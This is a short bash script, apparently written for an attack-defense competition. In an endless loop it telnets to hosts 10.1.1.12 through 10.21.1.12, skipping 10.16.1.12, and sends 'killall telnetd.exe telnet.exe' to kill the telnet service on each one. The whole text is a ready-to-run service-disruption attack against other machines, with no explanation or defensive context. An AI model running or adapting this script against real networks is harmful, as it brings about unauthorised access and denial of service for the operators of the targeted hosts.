while true; do
  for i in {1..21}; do
    if [[ $i -ne 16 ]]; then
	  echo "killall telnetd.exe telnet.exe" | telnet 10.$i.1.12 23
	fi
  done
done

